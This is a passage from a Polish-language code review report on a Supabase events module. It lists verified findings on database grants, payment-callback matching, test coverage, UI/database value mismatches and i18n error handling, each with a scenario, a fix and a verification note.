**Weryfikacja.** Fakt bazowy potwierdzony: event_register ma `SET search_path = public, extensions` (supabase/migrations/20260827220945_...sql:191), payments_apply_event_ticket_outcome `SET search_path TO 'public','extensions'` (20260828055725:19), a w calym katalogu migracji jest 336 wystapien wariantu z pg_temp wobec 1461 samego `SET search_path = public` - czyli niespojnosc jest realna, ale to wzorzec CALEGO repozytorium, nie […]

### [niski] Callback platnosci moze trafic w niewlasciwy zapis uczestnika

`supabase/migrations/20260828055725_def3dc59-ad1e-4d7e-a7fd-60adb37b0e7c.sql:87` · blad · weryfikacja: PRAWDOPODOBNE

`payments_apply_event_ticket_outcome` szuka zapisu do zaktualizowania tak: `WHERE r.tenant_id = v_order.tenant_id AND r.event_id = v_event_id AND (r.payment_order_id = v_order.id OR (v_person_id IS NOT NULL AND r.person_id = v_person_id)) ORDER BY (r.payment_order_id = v_order.id) DESC, r.created_at DESC LIMIT 1 FOR UPDATE` (linie 81-89). Galaz alternatywna `r.person_id = v_person_id` nie sprawdza ani `r.payment_order_id IS NULL`, ani `r.ticket_type_id`, ani statusu — dopasowuje DOWOLNY zapis tej osoby na to wydarzenie. Sortowanie po created_at DESC wybiera najnowszy. Nastepnie galaz zwrotu (linie 128-141) ustawia `status = 'cancelled'`, zeruje `paid_at`, nadpisuje `payment_order_id = v_order.id` i zwalnia miejsce przez `_event_waitlist_promote`.

**Scenariusz.** Uczestnik kupuje bilet standard (zamowienie A), pozniej rezygnuje i kupuje bilet VIP (zamowienie B, nowszy zapis). Ksiegowosc zwraca srodki za zamowienie A. Webhook wola payments_apply_event_ticket_outcome(A,'refunded'). Zapis powiazany z A juz nie jest najnowszy, ale warunek `r.payment_order_id = v_order.id` moze nie trafic (np. gdy tamten zapis zostal wczesniej usuniety albo nigdy nie dostal payment_order_id), […]

**Naprawa.** Zawezic galaz alternatywna do zapisow, ktore jeszcze nie maja przypisanego zamowienia i nie sa oplacone: `OR (v_person_id IS NOT NULL AND r.person_id = v_person_id AND r.payment_order_id IS NULL AND r.payment_status <> 'paid' AND (v_ticket_type_id IS NULL OR r.ticket_type_id IS NOT DISTINCT FROM v_ticket_type_id))`. Dla wynikow 'refunded' i 'partial_refund' w ogole zrezygnowac z galezi po person_id — zwrot musi […]

**Weryfikacja.** Zapytanie jest dokladnie takie, jak opisano (supabase/migrations/20260828055725_...sql:80-89), a galaz zwrotu istotnie kasuje zapis i zwalnia miejsce (:128-141). Ale opisany scenariusz jest w praktyce zablokowany przez rzeczy, ktorych ustalenie nie sprawdzilo: (1) `ORDER BY (r.payment_order_id = v_order.id) DESC` daje bezwzgledne pierwszenstwo wierszowi powiazanemu z tym zamowieniem, (2) anulowanie NIE kasuje […]

### [niski] Grant kolumnowy na event_package_seats.invite_token_hash jest bezskuteczny — poprzedza go grant tabelowy

`supabase/migrations/20260825191948_ab7f57aa-961d-436a-ba0f-2fd114f42844.sql:442` · bezpieczenstwo · weryfikacja: POTWIERDZONE

Linia 401: `GRANT SELECT, INSERT, UPDATE, DELETE ON public.event_package_seats TO authenticated;` (grant TABELOWY), linia 442: `REVOKE ALL (invite_token_hash) ON public.event_package_seats FROM authenticated, anon;` (revoke KOLUMNOWY). W PostgreSQL uprawnienie efektywne na kolumnie to suma uprawnien kolumnowych i tabelowych — revoke kolumnowy nie zdejmuje grantu tabelowego, silnik zwraca tylko WARNING. Repozytorium samo zna te regule i opisuje ja slowami "grant tabelowy przeslania kolumnowy" w 20260823160000_event_sponsors_companies.sql:644, gdzie poprawnie daje `REVOKE SELECT ... FROM anon; REVOKE SELECT ... FROM authenticated;` PRZED grantem kolumnowym; tak samo robi event_scanner_devices (20260823180000:429) i event_sessions (20260823140000:592). Komentarz w linii 447 twierdzi "Kolumna odcieta grantem od rol klienckich" — to nieprawda. Ta sama usterka jest w oryginale, 20260824080000:571. Polityka `event_package_seats_buyer_read` (linia 423) wpuszcza nabywce pakietu na wszystkie […]

**Scenariusz.** Firma kupuje pakiet 20 wejsciowek i rozsyla zaproszenia. Nabywca (zwykla rola authenticated, nie admin) wola supabase.from('event_package_seats').select('id,invite_email,invite_token_hash').eq('package_order_id', <swoje zamowienie>) i dostaje hasze tokenow zaproszen wszystkich 20 osob — mimo ze migracja deklaruje te kolumne za odcieta. Analogicznie `update({invite_token_hash: ...})` jest dozwolony na poziomie grantu […]

**Naprawa.** Zastosowac wzorzec z 20260823160000:645-652: najpierw `REVOKE ALL ON public.event_package_seats FROM anon, authenticated;`, potem jawny `GRANT SELECT (id, tenant_id, event_id, package_order_id, registration_id, invite_email, invited_at, accepted_at, revoked_at, assigned_by, created_at, updated_at) ON public.event_package_seats TO authenticated;` i osobno wezsze granty INSERT/UPDATE/DELETE, jesli zapis z klienta jest […]

**Weryfikacja.** Kolejnosc instrukcji potwierdzona co do linii: supabase/migrations/20260825191948_...sql:401 `GRANT SELECT, INSERT, UPDATE, DELETE ON public.event_package_seats TO authenticated;` (tabelowy), :425 polityka event_package_seats_buyer_read, :442 `REVOKE ALL (invite_token_hash) ... FROM authenticated, anon;` (kolumnowy) i komentarz :446-447 twierdzacy, ze kolumna jest odcieta. To samo w oryginale 20260824080000:571. […]

### [niski] Kontrakt pgtap nie pilnuje polityk zapisu na tabeli events

`supabase/tests/event_admin_only_contract_test.sql:39` · brak-testow · weryfikacja: POTWIERDZONE

Obie asercje kontraktu jawnie wylaczaja `events` z zakresu: `AND p.tablename NOT IN ('events', 'event_rsvps', 'event_speakers')` (linie 39 i 56). Uzasadnienie w komentarzu (linia 29) jest sluszne dla ODCZYTU — ekran listy wydarzen ma zostac powierzchnia redakcyjna — ale wyjatek jest zalozony na cala tabele, wiec obejmuje takze polityke `events staff write` FOR ALL. Test, ktory zostal napisany po to, zeby zadne przyszle CREATE POLICY nie cofnelo zawezenia bez sladu w diffie, ma w tym jednym miejscu slepa plamke, i to akurat na tabeli, ktora jest korzeniem calego modulu.

**Scenariusz.** Naprawa opisana w ustaleniu numer 2 zostaje wdrozona, a trzy tygodnie pozniej kolejna migracja generowana automatycznie odtwarza `events staff write` w domyslnym wzorcu `admin OR editor`. Zestaw pgtap przechodzi na zielono, przeglad diffu widzi tylko odtworzenie znanej polityki, a zawezenie znika po cichu — dokladnie ten scenariusz, ktory ten plik opisuje w komentarzu jako powod swojego istnienia.

**Naprawa.** Zwezic wyjatek z poziomu tabeli do poziomu komendy: w asercji 1 dodac warunek `AND p.cmd <> 'SELECT'` i usunac 'events' z listy NOT IN, albo dopisac trzecia asercje — SELECT is_empty na pg_policies dla tablename = 'events' AND cmd IN ('ALL','INSERT','UPDATE','DELETE') AND qual ~ '''editor'''.

**Weryfikacja.** Przeczytalem plik supabase/tests/event_admin_only_contract_test.sql:22-60. Obie asercje istotnie maja `AND p.tablename NOT IN ('events','event_rsvps','event_speakers')` - linia 39 (asercja o roli editor) i linia 56 (asercja o is_super_admin) - a wyjatek jest zalozony na CALA tabele, wiec obejmuje takze polityke `events staff write` FOR ALL z 20260713093000:95-110, ktora realnie wpuszcza redakcje do zapisu (patrz […]

### [niski] Nowe kolumny events dopisane ALTER-em nie weszly do grantu kolumnowego

`supabase/migrations/20260826120000_event_pages_and_public_columns.sql:32` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Ta migracja poprawnie uzupelnia przyrostowo grant kolumnowy na `events` o 17 kolumn (linie 32-50) i sama w komentarzu (linie 7-14) opisuje pulapke: kolumna dopisana ALTER-em nie wchodzi do listy sama, wiec SELECT na nia konczy sie odmowa uprawnien. Osiem kolumn zostalo mimo to poza lista: `registration_mode`, `registration_flow`, `external_registration_url`, `event_type_id`, `cancelled_at` (dodane w 20260823120000:210-219), `features` (20260826090000) oraz `discussion_club_id` i `discussion_group_id` (20260826182500:125, :129). Baza grantu to 20260803191905:3-10, gdzie wypisano 29 kolumn.

**Scenariusz.** Dowolne rozszerzenie zapytania publicznego o tryb zapisow — np. dopisanie `registration_mode` do EVENT_COLUMNS w src/lib/community/publicQueries.ts:75, zeby lista wydarzen umiala pokazac 'zapisy zamkniete' albo przycisk do narzedzia zewnetrznego — powoduje blad 42501 permission denied for column registration_mode na CALEJ liscie wydarzen, dla anona i dla zalogowanego. To samo dotyczy `select('*')` na events z […]

**Naprawa.** Dopisac jeden przyrostowy `GRANT SELECT (registration_mode, registration_flow, external_registration_url, event_type_id, cancelled_at, features) ON public.events TO anon, authenticated;` (kolumny discussion_* rozwazyc osobno — jesli maja zostac wewnetrzne, opisac to komentarzem, zeby brak nie wygladal na przeoczenie). NIE odtwarzac calej listy kolumn — to jest ruch, ktorym gubi sie odciecie join_url i recording_url.

**Weryfikacja.** Sprawdzilem obie listy grantu: baza to supabase/migrations/20260803191905_...sql:2-10 (REVOKE + 29 kolumn), uzupelnienie to 20260826120000_event_pages_and_public_columns.sql:32-50 (17 kolumn). Przeszukalem WSZYSTKIE instrukcje `GRANT SELECT (...)` w katalogu migracji pod katem osmiu wymienionych kolumn - registration_mode, registration_flow, external_registration_url, event_type_id, cancelled_at, features, […]

### [niski] event_registrations wystawione grantem tabelowym, wraz z haszami tokenow QR i uchwytu samoobslugowego

`supabase/migrations/20260823150000_event_people_registration.sql:797` · niespojnosc · weryfikacja: POTWIERDZONE

Linia 797: `GRANT SELECT ON public.event_registrations TO authenticated;` — grant TABELOWY, obejmujacy kolumny `qr_token_hash` (definicja w linii 674) i `manage_token_hash` (linia 683). Modul ma dla takich kolumn wlasny wzorzec i stosuje go konsekwentnie gdzie indziej: event_sessions dostaje REVOKE ALL + grant kolumnowy bez stream_url/recording_url (20260823140000:592-599), event_scanner_devices bez token_hash (20260823180000:429-436), event_sponsors bez kolumn kontaktowych (20260823160000:645-652). Komentarz przy qr_token_hash (linia 763) deklaruje "zrzut tabeli nie daje wstepu" — to prawda tylko dlatego, ze w kolumnie jest SHA-256, a nie dlatego, ze kolumna jest odcieta. Ekspozycja jest ograniczona do wlasnego wiersza przez polityke event_registrations_self_read (:817), wiec skutek praktyczny jest maly.

**Scenariusz.** Uczestnik wola supabase.from('event_registrations').select('*') i otrzymuje wlasny wiersz razem z qr_token_hash i manage_token_hash. Same hasze nie daja wstepu, ale wyciek trafia do logow klienta, do cache przegladarki i do kazdego narzedzia analitycznego podpietego pod fetch. Powazniejsze jest to, ze wzorzec jest przerwany: kolejna kolumna sekretna dopisana do tej tabeli (np. token platnosci albo kod dostepu do […]

**Naprawa.** Zamienic grant tabelowy na kolumnowy wedlug wzorca z 20260823140000:592: `REVOKE ALL ON public.event_registrations FROM anon, authenticated;` a nastepnie `GRANT SELECT (<jawna lista kolumn bez qr_token_hash i manage_token_hash>) ON public.event_registrations TO authenticated;`. Panel i tak czyta te tabele przez admin_event_registrations_list, a uczestnik przez event_my_registrations — obie funkcje sa SECURITY […]

**Weryfikacja.** Potwierdzone co do linii: supabase/migrations/20260823150000_event_people_registration.sql:797 `GRANT SELECT ON public.event_registrations TO authenticated;` (tabelowy, powtorzony w 20260824085456:545), kolumny qr_token_hash i manage_token_hash zdefiniowane w tej samej tabeli, a `rg` po wszystkich migracjach nie znajduje ZADNEGO REVOKE ani grantu kolumnowego na tej tabeli, ktory by je odcial. Zasieg faktycznie […]

---

## Parytet RPC ↔ klient

> Warstwa RPC modułu jest wyjątkowo spójna mechanicznie: skryptowe porównanie 191 wywołań `.rpc()` z `src/**` z sygnaturami wyciągniętymi ze wszystkich 906 migracji nie znalazło ANI JEDNEGO wywołania nieistniejącej funkcji, ani jednego błędnego lub brakującego argumentu, ani jednej literówki w nazwie parametru. `src/integrations/supabase/types.ts` jest świeży: wszystkie 274 funkcje `event_*`/`admin_event_*` mają wpis, a 47 funkcji `RETURNS TABLE` zgadza się kolumna po kolumnie. Kontrakt ładunków `jsonb` (87 funkcji z argumentem jsonb) też się domyka w obie strony - żaden klucz wysyłany przez TS nie jest ignorowany przez SQL, a parsery odpowiedzi czytają dokładnie te klucze, które `jsonb_build_object`/`row_to_json` buduje. Realne rozjazdy siedzą JEDNO PIĘTRO NIŻEJ, tam gdzie nie sięga TypeScript: w zamkniętych słownikach wartości (tablice `as const` kontra `CHECK` w bazie) oraz w mapowaniu kodów wyjątków plpgsql na klucze i18n. Dwa słowniki formatów/odbiorców są rozjechane z bazą tak, że oferują w UI wartości, których baza nie przyjmie, i ukrywają te, które przyjmuje. Dodatkowo […]

### [wysoki] Lista formatów papieru identyfikatora rozjechana z CHECK-em bazy: UI oferuje `cr80`, którego baza nie przyjmuje, i ukrywa cztery formaty, które przyjmuje

`src/lib/events/onsiteApi.ts:64` · blad · weryfikacja: POTWIERDZONE

`export const BADGE_PAPER_FORMATS = ["a6", "a7", "cr80", "custom"] as const;` Baza dopuszcza SIEDEM innych wartości: `CHECK (paper_format IN ('a4','a5','a6','a7','badge_90x54','badge_100x150','custom'))` (supabase/migrations/20260824101451_98a0f340-c9c9-4198-a576-ea6694edff2f.sql:23) i tę samą listę powtarza walidacja RPC: `IF v_format NOT IN ('a4','a5','a6','a7','badge_90x54','badge_100x150','custom') THEN RAISE EXCEPTION 'invalid_paper_format'` (20260825061559_57396b2b...sql:123). Rozjazd jest obustronny: `cr80` NIE ISTNIEJE w bazie, a `a4`, `a5`, `badge_90x54`, `badge_100x150` są nieosiągalne z panelu. Ta sama lista rządzi selektorem (src/components/admin/events/molecules/BadgeTemplateDialog.tsx:120), walidacją wersji roboczej (src/lib/events/onsiteDraft.ts:114-116) i - co gorsza - fizycznymi wymiarami wydruku: `src/lib/events/badgeSheet.ts:47` zna tylko `a6/a7/cr80`, a `badgeSizeMm` degraduje każdą nieznaną wartość do A6 (badgeSheet.ts:53, 68). Słownik i18n też zna tylko cztery […]

**Scenariusz.** Organizator otwiera „Identyfikatory", wybiera z listy „CR80 (karta)" - jedyny format odpowiadający drukarce kart - i zapisuje szablon. RPC podnosi `invalid_paper_format: unknown paper format cr80`, panel pokazuje „Nieznany format papieru." i szablonu nie da się zapisać ŻADNYM sposobem. Odwrotnie: szablon wpisany do bazy z `badge_90x54` (jedyny realny format karty w bazie) wraca do panelu jako wartość spoza listy, […]

**Naprawa.** Zamienić BADGE_PAPER_FORMATS na dokładne odwzorowanie CHECK-a: ["a4","a5","a6","a7","badge_90x54","badge_100x150","custom"], dopisać wymiary w PAPER_MM w badgeSheet.ts (badge_90x54 = 90×54 mm, badge_100x150 = 100×150 mm, a4 = 210×297, a5 = 148×210), poprawić `isPaperFormat` w badgeSheet.ts:53 na test po tablicy zamiast czterech porównań i uzupełnić `adminEventOnsite.paperFormats.*` w obu językach. Jeśli CR80 ma […]

**Weryfikacja.** Sprawdzone wszystkie warstwy. src/lib/events/onsiteApi.ts:64 daje dokladnie ["a6","a7","cr80","custom"]; CHECK w supabase/migrations/20260824101451_98a0f340...sql:23-25 to ('a4','a5','a6','a7','badge_90x54','badge_100x150','custom') - identycznie w pierwotnej migracji 20260823180000_event_onsite.sql:802-804; walidacja RPC w 20260825061559_57396b2b...sql:123 powtarza te sama siodemke. Szukalem ALTER/DROP CONSTRAINT […]

### [wysoki] Lista odbiorców pakietu miejsc rozjechana z CHECK-em: trzy z czterech wartości oferowanych w UI baza odrzuca naruszeniem ograniczenia

`src/lib/events/packagesApi.ts:25` · blad · weryfikacja: POTWIERDZONE

`/** Odbiorca pakietu - odwzorowanie CHECK-a `audience` jeden do jednego. */ export const PACKAGE_AUDIENCES = ["company", "university", "delegation", "partner"] as const;` Komentarz jest nieprawdziwy. `admin_event_package_upsert` pisze do `public.event_ticket_packages` (supabase/migrations/20260827221214_14a3d2bb...sql:151), a ta tabela ma `CONSTRAINT event_ticket_packages_audience_values CHECK (audience IN ('public','member','academic','ngo','company'))` (20260825191948_ab7f57aa...sql:181). Wspólna jest WYŁĄCZNIE wartość `company`; `university`, `delegation` i `partner` nie istnieją w bazie, a `public`, `member`, `academic`, `ngo` są nieosiągalne z panelu. RPC nie waliduje `audience` w ogóle - wstawia je wprost (`COALESCE(NULLIF(p_payload->>'audience',''), 'company')`, tamże:160), więc do klienta wraca surowy błąd 23514, którego `adminRegistrationErrorMessage` (użyty w src/components/admin/events/organisms/EventPackagesPanel.tsx:83) nie rozpozna i zdegraduje do komunikatu ogólnego.

**Scenariusz.** Redakcja tworzy pakiet miejsc dla delegacji uczelnianej, wybiera w dialogu (src/components/admin/events/molecules/EventPackageDialog.tsx:128) „Uczelnia" i zapisuje. Baza odrzuca wiersz naruszeniem `event_ticket_packages_audience_values`, panel pokazuje „Operacja się nie udała. Spróbuj ponownie." bez wskazania pola, a każda kolejna próba kończy się tak samo - poza jedynym działającym wyborem „Firma".

**Naprawa.** Przepisać PACKAGE_AUDIENCES na wartości z CHECK-a (`public`, `member`, `academic`, `ngo`, `company`) wraz z etykietami i18n, albo - jeśli produkt naprawdę potrzebuje `university`/`delegation`/`partner` - rozszerzyć CHECK nową migracją i dopisać walidację `audience` w admin_event_package_upsert, żeby odmowa miała nazwany kod zamiast 23514.

**Weryfikacja.** src/lib/events/packagesApi.ts:25-26 deklaruje ["company","university","delegation","partner"] z komentarzem o odwzorowaniu CHECK-a jeden do jednego. CHECK event_ticket_packages_audience_values w supabase/migrations/20260825191948_ab7f57aa...sql:180-181 dopuszcza ('public','member','academic','ngo','company'); to samo w 20260824080000_event_admissions_packages_coupons.sql:268. Przeszukalem wszystkie migracje pod […]

### [średni] Cały podmoduł zakupu pakietów i zgód odbiorców istnieje w bazie bez ani jednego konsumenta w kliencie

`supabase/migrations/20260827221214_14a3d2bb-aa5d-48d3-bb31-34aff2c14dc5.sql:561` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Porównanie kompletu funkcji `event_*`/`admin_event_*` z definicjami RPC z całego `src/` daje jedenaście funkcji z GRANT-em i bez wywołania: `event_package_purchase` (20260825191948_ab7f57aa...sql:958), `event_package_seat_invite` (tamże:1064), `event_package_invite_accept` (20260827221214...sql:561), `event_admission_quote` (20260825191948...sql:603), `event_audience_qualifies` (tamże:538), `admin_event_audience_grant_save` (:1225), `admin_event_audience_grant_revoke` (:1272), `admin_event_package_seat_assign` (:1150), `admin_event_ticket_package_save` (:863), `events_public_list` (20260824100459_1729613d...sql:2), `event_ad_placements` (tamże:299). Wszystkie są w `src/integrations/supabase/types.ts`, więc nie chodzi o brak typów, tylko o brak powierzchni. Panel administracyjny obsługuje pakiety wyłącznie od strony organizatora (packagesApi.ts wywołuje dziewięć funkcji `admin_event_package_*`), ale ścieżka „kupujący klika, płaci, rozdziela miejsca zaproszeniami" nie ma po stronie […]

**Scenariusz.** Organizator konfiguruje w panelu pakiet dziesięciu miejsc dla firmy i publikuje wydarzenie. Firma nie ma jak go kupić: żaden ekran publiczny nie woła `event_admission_quote` ani `event_package_purchase`, a zaproszony pracownik nie ma jak przyjąć miejsca, bo `event_package_invite_accept` nie jest wołane z niczego. Miejsce można przypisać wyłącznie ręcznie z panelu.

**Naprawa.** Zdecydować i zapisać w par. 8 dokumentu projektu, czy pakiety mają dziś tylko powierzchnię administracyjną. Jeśli tak - oznaczyć jedenaście funkcji komentarzem „bez konsumenta, etap X" albo cofnąć im GRANT dla anon/authenticated, żeby nie zostawiać otwartej powierzchni bez ekranu. Jeśli nie - domknąć ścieżkę uczestnika (wycena, zakup, zaproszenie miejsca, przyjęcie zaproszenia).

**Weryfikacja.** Sprawdzilem kazda z jedenastu nazw grepem po calym src/ z wykluczeniem wygenerowanych typow: event_package_purchase, event_package_seat_invite, event_package_invite_accept, event_admission_quote, event_audience_qualifies, admin_event_audience_grant_save, admin_event_audience_grant_revoke, admin_event_package_seat_assign, admin_event_ticket_package_save, events_public_list, event_ad_placements - wszystkie daja 0 […]

### [średni] Kreator nowego wydarzenia pokazuje surowy angielski komunikat Postgresa zamiast przetłumaczonej odmowy

`src/routes/admin.events_.new.tsx:110` · i18n · weryfikacja: POTWIERDZONE

`onError: (error) => toast.error(error.message),` To jedyne miejsce w module, w którym wynik RPC nie przechodzi przez mapper - pozostałe ekrany studia wołają `adminEventStudioErrorMessage`, `adminAgendaErrorMessage`, `adminOnsiteErrorMessage` itd. `admin_event_create` (supabase/migrations/20260827065451_9dcc93fb...sql:432) podnosi m.in. `event_type_inactive`, `invalid_type`, `invalid_city`, `invalid_country`, `invalid_timezone`, `invalid_titles`, `external_url_required`, `external_url_invalid`, `not_found` - a `adminEvents.studio.errors` (src/lib/i18n-admin-events.ts:505-545) nie ma kluczy `eventTypeInactive`, `invalidType`, `invalidCity`, `invalidCountry`. Klucze o tych nazwach istnieją wyłącznie w gałęzi `adminEvents.list.create.errors` (tamże:300-313) i służą walidacji po stronie formularza, nie mapowaniu odmowy bazy.

**Scenariusz.** Redaktor otwiera kreator, w międzyczasie administrator wyłącza wybrany rodzaj wydarzenia w katalogu. Po kliknięciu „Utwórz" na ekranie polskiego panelu pojawia się toast o treści `event_type_inactive: event type is not active in this organisation` - surowy komunikat plpgsql, którego adresatem jest programista czytający logi, a nie redaktor.

**Naprawa.** Podpiąć `adminEventStudioErrorMessage` (albo dedykowany mapper kreatora) w onError w admin.events_.new.tsx:110 i uzupełnić `adminEvents.studio.errors` o brakujące klucze: `eventTypeInactive`, `invalidType`, `invalidCity`, `invalidCountry`, `invalidTimezone`.

**Weryfikacja.** src/routes/admin.events_.new.tsx:110 to faktycznie `onError: (error) => toast.error(error.message)`, a lancuch nie ma po drodze mappera: useCreateEventFromType (src/lib/events/useAdminEvents.ts:75-86) nie tyka bledu, a createEventFromType (src/lib/events/eventsListApi.ts:102-124) robi `if (error) throw error`, czyli rzuca surowy PostgrestError z tekstem plpgsql. Kody odmowy potwierdzone w […]

### [średni] Stan `refunded` zamówienia pakietu istnieje w bazie, ale klient go nie zna - lista statusów i koercja w panelu pokazują zwrot jako „oczekujące"

`src/lib/events/packagesApi.ts:30` · blad · weryfikacja: NIEZWERYFIKOWANE

`export const PACKAGE_ORDER_STATUSES = ["pending", "paid", "cancelled"] as const;` Baza zna cztery stany: `CHECK (status IN ('pending','paid','cancelled','refunded'))` (supabase/migrations/20260825191948_ab7f57aa...sql:272), a RPC przyjmuje ten sam komplet: `IF v_status NOT IN ('pending','paid','cancelled','refunded') THEN RAISE EXCEPTION 'invalid_status'` (20260827221214_14a3d2bb...sql:367). Do tego panel koercjonuje wartość odczytaną z bazy: `function orderStatus(value: string): PackageOrderStatus { return value === "paid" || value === "cancelled" ? value : "pending"; }` (src/components/admin/events/organisms/EventPackagesPanel.tsx:58). Ta funkcja karmi zarówno `value` selektora (tamże:302), jak i argument mutacji zmiany stanu (tamże:312).

**Scenariusz.** Zamówienie pakietu zostaje zwrócone i jego `status` to `refunded`. W panelu „Pakiety" selektor pokazuje przy nim „Oczekujące", bo `orderStatus` degraduje nieznaną wartość do `pending`. Operator, który dotknie tego selektora (choćby żeby sprawdzić opcje), wyśle `admin_event_package_order_set_status` ze stanem `pending` i skasuje informację o zwrocie razem z `paid_at`. Jednocześnie nie ma z panelu ŻADNEJ drogi, żeby […]

**Naprawa.** Dopisać `refunded` do PACKAGE_ORDER_STATUSES i do słownika `adminEventRegistration.packages.orders.statuses.*`, a `orderStatus` przepisać na test po tablicy (`PACKAGE_ORDER_STATUSES.includes(value) ? value : "pending"`). Rozważyć zablokowanie selektora dla stanów końcowych, żeby przypadkowe dotknięcie nie cofało zwrotu.

### [niski] Panel uczestnika dokleja surowy komunikat SQL do toastu z błędem zapisu wizytówki

`src/components/events/participant/molecules/MyEventProfileForm.tsx:197` · i18n · weryfikacja: POTWIERDZONE

`onError: (error) => toast.error(`${t("eventMe.profileSaveError")} ${error.message}`.trim()),` `event_my_event_profile_set` podnosi kody `invalid_social_key` (supabase/migrations/20260828124053_33677365...sql:42), `invalid_email`, `invalid_url`, `auth_required`, `invalid_slug`, a `event_my_event_profile_sync_account` dokłada `no_account_profile` (20260828105751_220005d0...sql:488). Żaden z tych kodów nie ma odpowiednika i18n - `rg noAccountProfile src` i `rg invalidSocialKey src` nie dają trafienia - a moduł nie ma mappera odpowiadającego `publicRegistrationErrors.ts` dla tej powierzchni.

**Scenariusz.** Uczestnik wkleja w polu „Inne" adres profilu w sieci, której baza nie obsługuje. Zamiast zdania po polsku widzi „Nie udało się zapisać profilu. invalid_social_key: mastodon is not a supported network" - z angielskim ogonem plpgsql wewnątrz polskiego interfejsu publicznego.

**Naprawa.** Dodać mapper analogiczny do publicRegistrationErrors.ts z prefiksem `eventMe.errors.` i kluczami dla invalidSocialKey, invalidEmail, invalidUrl, invalidSlug, authRequired, noAccountProfile, invalidTenant; przestać doklejać `error.message` do toasta na powierzchni uczestnika.

**Weryfikacja.** src/components/events/participant/molecules/MyEventProfileForm.tsx:197 doklada `${error.message}` do przetlumaczonego zdania, a modul nie ma mappera (grep 'noAccountProfile|invalidSocialKey' po src/ bez trafien; jedyne profileSaveError to i18n-cart.ts:70/265). Doprecyzowanie: przykladowy scenariusz z ustalenia jest nietrafny - formularz nie ma pola 'Inne' ani wolnego klucza sieci, iteruje po zamknietej liscie […]

### [niski] Wczytanie pakietu o odbiorcy spoza listy TS po cichu przepisuje go na `company` przy pierwszym zapisie

`src/lib/events/packageDraft.ts:94` · blad · weryfikacja: POTWIERDZONE

`audience: (PACKAGE_AUDIENCES as readonly string[]).includes(row.audience) ? (row.audience as PackageAudience) : "company",` Ponieważ lista TS (packagesApi.ts:25) nie pokrywa się z CHECK-em bazy, KAŻDY istniejący wiersz z `audience` równym `public`, `member`, `academic` albo `ngo` - a takie wiersze może utworzyć starsza funkcja `admin_event_ticket_package_save` (20260825191948_ab7f57aa...sql:863, pisząca do tej samej tabeli) - wraca do formularza jako „Firma". Zapis formularza wysyła już `company` i baza nadpisuje pierwotną wartość, bo `admin_event_package_upsert` bierze `audience` bezwarunkowo (20260827221214_14a3d2bb...sql:117).

**Scenariusz.** Pakiet skierowany do organizacji pozarządowych (`audience = 'ngo'`, z wymogiem weryfikacji dopuszczanym wyłącznie dla academic/ngo/company - CHECK w 20260825191948...sql:183) zostaje otwarty w panelu, żeby poprawić literówkę w nazwie. Po zapisie odbiorca jest już `company`, wycena i reguły weryfikacji przestają odpowiadać temu, po co pakiet powstał, a w interfejsie nic o tej zmianie nie mówi.

**Naprawa.** Naprawić PACKAGE_AUDIENCES (patrz ustalenie o odbiorcach), a niezależnie od tego nie degradować nieznanej wartości do wartości domyślnej przy ZAPISIE: albo pomijać klucz `audience` w ładunku, gdy wersja robocza nie zmieniała tego pola, albo zablokować formularz z jawnym komunikatem, że wiersz ma odbiorcę nieznanego temu ekranowi.

**Weryfikacja.** Mechanizm potwierdzony: src/lib/events/packageDraft.ts:94-96 degraduje kazdy audience spoza PACKAGE_AUDIENCES do "company", a packageDraft.ts:187 wysyla te wartosc dalej (packagesApi.ts:95), przy czym RPC nadpisuje kolumne, bo COALESCE(NULLIF(p_payload->>'audience',''), p.audience) w 20260827221214_14a3d2bb...sql:117 dostaje niepusty napis. ZANIZAM WAGE: wiersz z audience 'ngo'/'academic'/'public'/'member' nie moze […]

### [niski] Wywołanie `get_public_speakers` obchodzi typowanie przez `as unknown as`, mimo że wygenerowane typy są aktualne

`src/lib/builder/speakersQuery.ts:152` · ryzyko · weryfikacja: POTWIERDZONE

`supabase.rpc as unknown as (fn: string, args: { p_event_id: string | null; p_user_ids: string[] | null; p_limit: number }) => Promise<{ data: unknown; error: ... }>` Komentarz nad tym miejscem (speakersQuery.ts:174-180) uzasadnia rzutowanie tym, że „get_public_speakers powstało w migracji nowszej niż ostatnie odświeżenie wygenerowanych typów". To już nieprawda: `src/integrations/supabase/types.ts:24325` zawiera pełną sygnaturę `get_public_speakers` z `Args: { p_event_id?: string; p_limit?: number; p_user_ids?: string[] }` i kompletem 20 kolumn zwracanych, zgodną z definicją w supabase/migrations/20260727200000_speaker_profiles_event_widgets.sql:110. Rzutowanie wyłącza więc JEDYNĄ bramkę, która w tym repozytorium wychwytuje literówkę w nazwie argumentu (Supabase mapuje po nazwie, więc pomyłka jest błędem czasu wykonania, nie kompilacji), i dodatkowo zwraca `data: unknown`, przez co dalsze `mapSpeakerRow(raw as Record<string, unknown>)` (:204) też jest niesprawdzane.

**Scenariusz.** Ktoś zmienia nazwę argumentu w `get_public_speakers` (np. `p_user_ids` na `p_users`) nową migracją i odświeża types.ts. Bramka `check:types-freshness` przechodzi, `tsc` przechodzi, bo wywołanie jest rzutowane - a lista prelegentów na stronie wydarzenia przestaje działać dopiero na produkcji, z błędem PostgREST o nieznanej funkcji.

**Naprawa.** Usunąć rzutowanie i wołać `supabase.rpc("get_public_speakers", { p_event_id, p_user_ids, p_limit })` wprost, tak jak sąsiednie wywołanie `event_speakers_public` w tym samym pliku (:198). Zaktualizować albo skasować komentarz :174-180, który dziś opisuje nieistniejący stan.

**Weryfikacja.** Rzutowanie stoi w src/lib/builder/speakersQuery.ts:150-159, a uzasadnienie w komentarzu :141-144 i :173-180 jest juz nieaktualne: src/integrations/supabase/types.ts:24325-24347 zawiera pelna sygnature get_public_speakers (Args: p_event_id?, p_limit?, p_user_ids? plus 20 kolumn zwracanych), zgodna z definicja w supabase/migrations/20260727200000_speaker_profiles_event_widgets.sql:110-114; zadna pozniejsza migracja […]

### [niski] `tier_over_capacity` przy obniżaniu pojemności poziomu sponsorskiego bez klucza i18n

`supabase/migrations/20260824092824_bb9c20c9-c2c3-4ad9-ba7f-0683d7530c5a.sql:116` · i18n · weryfikacja: POTWIERDZONE

`'tier_over_capacity: % company(ies) already pinned, limit % is lower'` Słownik `adminEventSponsors.errors` (src/lib/i18n-admin-event-sponsors.ts:85-87) zna bliźniacze kody `tierInUse` i `tierFull` wraz z interpolacją {{count}}/{{total}}, ale nie zna `tierOverCapacity`; wyszukanie tej nazwy w całym `src/` nie daje trafienia. Mapper adminSponsorErrors.ts:56 degraduje więc ten kod do `unknown`.

